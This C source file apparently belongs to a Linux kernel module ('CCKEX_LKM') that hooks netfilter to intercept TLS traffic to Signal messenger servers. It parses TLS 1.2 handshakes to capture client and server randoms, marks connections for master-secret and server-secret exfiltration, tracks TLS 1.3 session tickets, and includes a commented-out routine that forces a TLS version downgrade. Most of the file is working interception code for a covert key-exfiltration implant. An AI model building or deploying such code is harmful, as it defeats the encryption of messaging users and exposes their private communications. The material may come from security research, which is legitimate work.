#include "tls.h"

#include <linux/ipv6.h>
#include <linux/udp.h>
#include <linux/tcp.h>
#include <linux/ip.h>

#include "../common.h"
#include "heur_filter.h"
#include "connection_list.h"

#include "tls_crypto.h"
#include "dns.h"

#define TARGET_TLS_PORT 443

#define TLS_TYPE_HANDSHAKE 22
#define TLS_TYPE_APPLICATION_DATA 23

#define TLS_HSTYPE_CLIENT_HELLO 1
#define TLS_HSTYPE_SERVER_HELLO 2

#define TLS_VERSION_13 0x0304
#define TLS_VERSION_12 0x0303
#define TLS_VERSION_10 0x0301

#define TLS_RANDOM_LENGTH 32

#define TLS_EXT_TYPE_SUPP_VERSION 43

typedef int (*filter_func_t)(uint8_t*, uint8_t*);

static int cckex_parse_tls_12_server_hello(struct sk_buff *skb, uint8_t* payload, size_t payload_len, unsigned offset, cckex_conn_list_entry_t *entry);
static int cckex_parse_tls_12_client_hello(struct sk_buff *skb, uint8_t* payload, size_t payload_len, unsigned offset, cckex_conn_list_entry_t *entry);

static int is_tls_handshake(uint8_t *payload, size_t payload_len) {
	// check version
	if(payload_len < 5) return 0; // pkg to short to contain type, version and length

	return GET_U8H(payload, 0) == TLS_TYPE_HANDSHAKE;
}

static int is_tls_application_data(uint8_t *payload, size_t payload_len) {
	// check version
	if(payload_len < 5) return 0; // pkg to short to contain type, version and length

	return GET_U8H(payload, 0) == TLS_TYPE_APPLICATION_DATA;
}

static uint16_t get_tls_version(uint8_t *payload, size_t payload_len) {
	// check version
	if(payload_len < 5) return 0; // pkg to short to contain type, version and length

	return GET_U16H(payload, 1);
}

static int cckex_filter_tls_12_hello_message(struct sk_buff *skb, uint8_t *payload, uint8_t *payload_end, cckex_conn_list_entry_t *entry) {

	size_t payload_len = PAYLOAD_LENGTH(payload, payload_end);

	unsigned offset = 3; // jump to length field of the whole tls message
	size_t tls_record_len = GET_U16H(payload, offset);
	uint8_t handshake_type = 0;

	if(tls_record_len - 5 <= 0) {
		pr_warn("CCKEX_LKM [%s] tls_record_len invalid: %zu", __func__, tls_record_len);
		return 0;
	}

	// advance to begin of handshake protocol
	offset += 2;

	handshake_type = 0;

	while(1) {

		if(offset >= payload_len) { break; }

		// get type
		handshake_type = GET_U8H(payload, offset);

		// parse different types
		if(handshake_type == TLS_HSTYPE_SERVER_HELLO) {
			cckex_parse_tls_12_server_hello(skb, payload, payload_len, offset, entry);
			break;
		} else if(handshake_type == TLS_HSTYPE_CLIENT_HELLO) {
			cckex_parse_tls_12_client_hello(skb, payload, payload_len, offset, entry);
			break;
		} else {
			pr_warn("CCKEX_LKM [%s] not supported hanshake type: %i", __func__, handshake_type);
			break;
		}

	}

	return 0;
}

/*	-- filter_tls13_new_session_ticket_packet --
 *
 *	Function tries to recognize TLS1.3 New Session Ticket Packages via a heuristic approach
 */
static int filter_tls13_new_session_ticket_packet(struct sk_buff *skb, uint8_t *payload, uint8_t *payload_end, cckex_conn_list_entry_t *entry) {

	unsigned offset;
	size_t payload_len;
	size_t tls_record_len;

	payload_len = PAYLOAD_LENGTH(payload, payload_end);
	
	if(payload_len < 5) {
		pr_warn("CCKEX_LKM [%s] payload_len < 5 -> TLS Package might be malformed.", __func__);
		return 0;
	}

	offset = 3; // jump to length field

	tls_record_len = GET_U16H(payload, offset);

	pr_info("CCKEX_LKM [%s] checking package with length %zu", __func__, tls_record_len);

	return tls_record_len == 83;

	// TODO: extend the heuristic approach to the decrypted package content
}

static int cckex_parse_tls_12_application_data(struct sk_buff *skb, uint8_t *payload, uint8_t *payload_end, cckex_conn_list_entry_t *entry) {

	size_t payload_len = PAYLOAD_LENGTH(payload, payload_end);

	unsigned offset = 3; // jump to length field of the whole tls message
	size_t tls_record_len = GET_U16H(payload, offset);

	if(tls_record_len - 5 <= 0) {
		pr_warn("CCKEX_LKM [%s] tls_record_len invalid: %zu", __func__, tls_record_len);
		return 0;
	}

	// advance to begin of application data
	offset += 2;

	//pr_info("CCKEX_LKM xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx CLIENT TLS RECORD xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx");

	//pr_info("CCKEX_LKM [%s]	record with entry -> client_random: ", __func__);
	//cckex_print_mem(entry->client_random, entry->client_random_size);

	//pr_info("CCKEX_LKM xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx CLIENT TLS RECORD xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx");

	// abort if sender write key is not send
	if(entry->client_write_key == NULL) {
		//pr_info("CCKEX_LKM [%s] client_write_key == NULL", __func__);
		return 0;
	}

	if(filter_tls13_new_session_ticket_packet(skb, payload, payload_end, entry)) {
		pr_info("CCKEX_LKM [%s] New Session Ticket was recognized -> reset seq counter.", __func__);
		entry->tls13_seq_num = 1;
	}

	return CCKEX_MSG_TYPE_TLS_RECORD;
}

static int cckex_filter_tls_hello_message(struct sk_buff *skb, int ip_proto, enum nf_inet_hooks hook_num) {

	uint8_t *payload_end = NULL;
	size_t payload_len = 0;
	cckex_conn_list_entry_t *entry = 0; 
	uint16_t dst_port = 0;
	uint16_t src_port = 0;
	uint32_t ip = 0;
	struct iphdr *iph = NULL;
	struct ipv6hdr *iph6 = NULL;
	uint8_t *payload = cckex_filter_source_port(skb, ip_proto, TARGET_TLS_PORT);
	if(!payload) {
		payload = cckex_filter_dest_port(skb, ip_proto, TARGET_TLS_PORT);
		if(!payload) {
			return 0;
		}
	}

	// check if connection is associated with signal server
	if(cckex_skb_is_ipv4(skb)) {
		iph = ip_hdr(skb);

		ip = 0;

		if(hook_num == NF_INET_POST_ROUTING) {
			ip = ntohl(iph->daddr);
		} else if(hook_num == NF_INET_LOCAL_IN) {
			ip = ntohl(iph->saddr);
		} else {
			pr_warn("CCKEX_LKM [%s] unknown hook_num = %i", __func__, hook_num);
			return 0;
		}

		// check if ip is associated with signal server
		if(!cckex_ipv4_is_associated_with_signal_messenger(ip)) {
			//pr_info("CCKEX_LKM [%s] ip is not associated with signal messenger", __func__);
			return 0;
		}

	} else if (cckex_skb_is_ipv6(skb)) {
		iph6 = ipv6_hdr(skb);

		if(hook_num == NF_INET_POST_ROUTING) {
			if(!cckex_ipv6_is_associated_with_signal_messenger(iph6->daddr)) {
				//pr_info("CCKEX_LKM [%s] ip is not associated with signal messenger", __func__);
				return 0;
			}

		} else if(hook_num == NF_INET_LOCAL_IN) {
			if(!cckex_ipv6_is_associated_with_signal_messenger(iph6->saddr)) {
				//pr_info("CCKEX_LKM [%s] ip is not associated with signal messenger", __func__);
				return 0;
			}
		} else {
			pr_warn("CCKEX_LKM [%s] unknown hook_num = %i", __func__, hook_num);
			return 0;
		}

	} else {
		pr_warn("CCKEX_LKM [%s] unknown hook_num = %i", __func__, hook_num);
	}

	// try to get connection entry
	src_port = cckex_skb_get_source_port(skb);
	dst_port = cckex_skb_get_dest_port(skb);

	entry = NULL;
	if(src_port == TARGET_TLS_PORT) {
		entry = cckex_conn_list_find_matching_port_pair(dst_port, src_port);
	} else {
		entry = cckex_conn_list_find_matching_port_pair(src_port, dst_port);
	}

	if(entry == NULL) {
		// no entry found -> create a new one
		entry = kmalloc(sizeof(cckex_conn_list_entry_t), GFP_ATOMIC);
		if(entry == NULL) {
			pr_warn("CCKEX_LKM [%s] failed to alloc cckex_conn_list_entry_t", __func__);
			return 0;
		}
		memset(entry, 0, sizeof(cckex_conn_list_entry_t));

		entry->local_port  = src_port == TARGET_TLS_PORT ? dst_port : src_port;
		entry->remote_port = src_port == TARGET_TLS_PORT ? src_port : dst_port;
		entry->exfil_master_secret = 1;
		entry->exfil_server_secret = 1;
	} else {
		// entry found -> check if connection is terminated 
		if(cckex_skb_tcp_fin(skb)) {
			cckex_conn_list_del(entry);
		}
	}

	payload_end = (uint8_t*)skb_tail_pointer(skb);
	payload_len = (size_t)((uint64_t)payload_end - (uint64_t)payload);

	if(is_tls_handshake(payload, payload_len)) {
		switch(get_tls_version(payload, payload_len)) {
			case TLS_VERSION_13:
				break;
			case TLS_VERSION_10:
			case TLS_VERSION_12:
				return cckex_filter_tls_12_hello_message(skb, payload, payload_end, entry);
				break;
			default:
				pr_warn("CCKEX_LKM [%s] unknown tls version: %.04x", __func__, GET_U16H(payload, 1));
				return 0;
				break;
		}
	} else if(is_tls_application_data(payload, payload_len) /* &&  hook_num == NF_INET_POST_ROUTING */) {	// disable hook_num check to enable the processing of incoming packages
		switch(get_tls_version(payload, payload_len)) {
			case TLS_VERSION_10:
			case TLS_VERSION_13:
				break;
			case TLS_VERSION_12:
				return cckex_parse_tls_12_application_data(skb, payload, payload_end, entry);
				break;
			default:
				pr_warn("CCKEX_LKM [%s] unknown tls version: %.04x", __func__, GET_U16H(payload, 1));
				return 0;
		}
	}

	return 0;
}

int cckex_filter_tls_hello_message_v4(struct sk_buff *skb, enum nf_inet_hooks hook_num) {
	struct iphdr *iph = ip_hdr(skb);
	return cckex_filter_tls_hello_message(skb, iph->protocol, hook_num);
}

int cckex_filter_tls_hello_message_v6(struct sk_buff *skb, enum nf_inet_hooks hook_num) {
	struct ipv6hdr *iph = ipv6_hdr(skb);
	return cckex_filter_tls_hello_message(skb, iph->nexthdr, hook_num);
}


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// SERVER SIDE
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

static int cckex_parse_tls_12_server_hello(struct sk_buff *skb, uint8_t* payload, size_t payload_len, unsigned offset, cckex_conn_list_entry_t *entry) {
	size_t session_id_len = 0;
	size_t len = 0; 
	uint16_t id = cckex_skb_get_source_port(skb);
	size_t i = 0;

	if(id == 443) id = cckex_skb_get_dest_port(skb);

	// get length of server hello
	len = GET_U32H(payload, offset) & 0x00ffffff;

	if(offset + len > payload_len) {
	pr_warn("CCKEX_LKM [%s:%i] offset (%i) + len (%zu) > payload_len (%zu)", __func__, id, offset, len, payload_len);
		return 0;
	}

	offset += 4; // jump over type, length

	if(GET_U16H(payload, offset) != TLS_VERSION_12) {
		//pr_info("CCKEX_LKM [%s:%i] tls version does not equal TLSv1.2: %.04x", __func__, id, GET_U16H(payload, offset));
		return 0;
	}

	offset += 2; // jump over version

	//pr_info("CCKEX_LKM xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx SERVER TLS HS xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx");

	// copy server random
	if(entry) {
		entry->server_random_size = TLS_RANDOM_LENGTH;
		entry->server_random = kmalloc(entry->server_random_size, GFP_KERNEL);
		if(entry->server_random) {
			memcpy(entry->server_random, (uint8_t*)payload + offset, entry->server_random_size);
		} else {
			//pr_info("CCKEX_LKM [%s:%i] failed to alloc entry->server_random", __func__, id);
		}
	} else {
		//pr_info("CCKEX_LKM [%s:%i] failed to get cckex_conn_list_entry", __func__, id);
	}

	// output server random
	//pr_info("CCKEX_LKM [%s:%i] Random: ", __func__, id);
	for(i = 0; i < TLS_RANDOM_LENGTH; i++) {
		//printk(KERN_CONT "%.02x", GET_U8H(payload, offset));
		offset += 1;
	}

	// output session id
	session_id_len = GET_U8H(payload, offset);
	offset += 1;
	//pr_info("CCKEX_LKM [%s:%i] Session Id (len=%zu): ", __func__, id, session_id_len);
	for(int i = 0; i < session_id_len; i++) {
		//printk(KERN_CONT "%.02x", GET_U8H(payload, offset));
		offset += 1;
	}

	// output cipher suite
	//pr_info("CCKEX_LKM [%s:%i] Session Cipher: %.04x", __func__, id, GET_U16H(payload, offset));
	offset += 2;

	// output compression method
	//pr_info("CCKEX_LKM [%s:%i] Compression Method: %.02x", __func__, id, GET_U8H(payload, offset));
	offset += 1;

	// output extension length
	offset += GET_U16H(payload, offset) + 2;

	//pr_info("CCKEX_LKM xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx SERVER TLS HS xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx");

	return offset;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// CLIENT SIDE
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

static int cckex_parse_tls_12_client_hello(struct sk_buff *skb, uint8_t *payload, size_t payload_len, unsigned offset, cckex_conn_list_entry_t *entry) {
	uint16_t version = 0;
	size_t versions_count = 0;
	size_t compression_len = 0;
	size_t ext_len = 0;
	size_t cipher_suites_len = 0; 
	uint16_t id = cckex_skb_get_source_port(skb);
	size_t session_id_len = 0;
	// get length of server hello
	size_t len = GET_U32H(payload, offset) & 0x00ffffff;

	if(id == 443) id = cckex_skb_get_dest_port(skb);

	if(offset + len > payload_len) {
	pr_warn("CCKEX_LKM [%s:%i] offset (%i) + len (%zu) > payload_len (%zu)", __func__, id, offset, len, payload_len);
		return 0;
	}

	offset += 4; // jump over type, length

	if(GET_U16H(payload, offset) != TLS_VERSION_12) {
		//pr_info("CCKEX_LKM [%s:%i] tls version does not equal TLSv1.2", __func__, id);
		return 0;
	}

	offset += 2; // jump over version

	// found new connection -> add entry to conn list
	//cckex_conn_list_add(entry);

	//pr_info("CCKEX_LKM xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx CLIENT TLS HS xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx");

	// copy client random
	if(entry) {
		entry->client_random_size = TLS_RANDOM_LENGTH;
		entry->client_random = kmalloc(entry->client_random_size, GFP_KERNEL);
		if(entry->client_random) {
			memcpy(entry->client_random, (uint8_t*)payload + offset, entry->client_random_size);
		} else {
			pr_warn("CCKEX_LKM [%s:%i] failed to alloc entry->server_random", __func__, id);
		}

		cckex_conn_set_ip_from_skb(entry, skb);

	} else {
		pr_warn("CCKEX_LKM [%s:%i] failed to get cckex_conn_list_entry", __func__, id);
	}

	// output client random
	//pr_info("CCKEX_LKM [%s:%i] Random: ", __func__, id);
	for(int i = 0; i < TLS_RANDOM_LENGTH; i++) {
		//printk(KERN_CONT "%.02x", GET_U8H(payload, offset));
		offset += 1;
	}

	// output session id
	session_id_len = GET_U8H(payload, offset);
	offset += 1;
	//pr_info("CCKEX_LKM [%s:%i] Session Id (len=%zu): ", __func__, id, session_id_len);
	for(int i = 0; i < session_id_len; i++) {
		//printk(KERN_CONT "%.02x", GET_U8H(payload, offset));
		offset += 1;
	}

	// output cipher suites
	cipher_suites_len = GET_U16H(payload, offset);
	offset += 2;
	//pr_info("CCKEX_LKM [%s:%i] Available Cipher Suites (count = %lu): ", __func__, id, cipher_suites_len / 2);
	for(size_t i = 0; i < cipher_suites_len; i += 2) {
		//printk(KERN_CONT "%.04x, ", GET_U16H(payload, offset));
		offset += 2;
	}

	// output compression method
	compression_len = GET_U8H(payload, offset);
	offset += 1;
	for(size_t i = 0; i < compression_len; i++) {
		//printk(KERN_CONT "%.02x, ", GET_U8H(payload, offset));
		offset += 1;
	}

	// extension length
	//offset += GET_U16H(payload, offset) + 2;
	ext_len = GET_U16H(payload, offset);

	offset += 2;

	// iterate over extensions
	while(ext_len) {
		ext_len -= GET_U16H(payload, offset + 2) + 4;

		if(GET_U16H(payload, offset) != TLS_EXT_TYPE_SUPP_VERSION) {
			offset += GET_U16H(payload, offset + 2) + 4;
			continue;
		}
	
		offset += 4;

		versions_count = GET_U8H(payload, offset) / 2;

		offset += 1;

		//pr_info("CCKEX_LKM [%s:%i] Found Supported Version Extension (count = %zu): ", __func__, id, versions_count);

		for(size_t i = 0; i < versions_count; i++) {
			version = GET_U16H(payload, offset);
			//pr_info("CCKEX_LKM [%s:%i] - %.04x", __func__, id, version);

			/*if(version == TLS_VERSION_13) {
				*(uint16_t*)(payload + offset) = TLS_VERSION_10;
				//printk(KERN_CONT " -> TLSv1.2");
				cckex_update_checksums(skb);
			}*/

			offset += 2;
		}

	}

	//pr_info("CCKEX_LKM xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx CLIENT TLS HS xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx");

	return 0;
}
